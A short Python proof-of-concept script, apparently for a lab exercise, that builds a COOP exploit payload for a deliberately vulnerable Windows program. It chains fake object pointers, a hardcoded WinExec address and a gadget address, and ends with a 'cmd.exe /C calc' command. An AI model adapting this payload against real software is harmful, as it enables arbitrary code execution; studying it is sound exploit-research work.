from pwintools import *
import sys

#proc = Process("../COOP_Vuln_program/x64/Debug/COOP_Vuln_program.exe")
WinExec = p64(0x7ffaab756200)
#WinExex = proc.get_proc_address('kernel32.dll','WinExec')
#log.info(proc)
inv_gadget = p64(0x140018440) 
#test = proc.recvall()
#proc.recvuntil(b'COOP buffer at:')
#buff_addr = proc.recvline()
buff_addr = int(input("Insert leaked address: "),16)
PAYLOAD = p64(buff_addr+0x18) +\
    p64(buff_addr+0x80) +\
    (WinExec) +\
    inv_gadget +\
    b'A'*(0x80-0x20) +\
    b"cmd.exe /C calc"
#proc.recvuntil(b'size:')
input ("Press any key... ")
#proc.sendline(len(PAYLOAD))
#proc.recvuntil(b'buffer:')
#proc.sendline(PAYLOAD)
#sys.stdout.buffer.write(PAYLOAD)
print(PAYLOAD)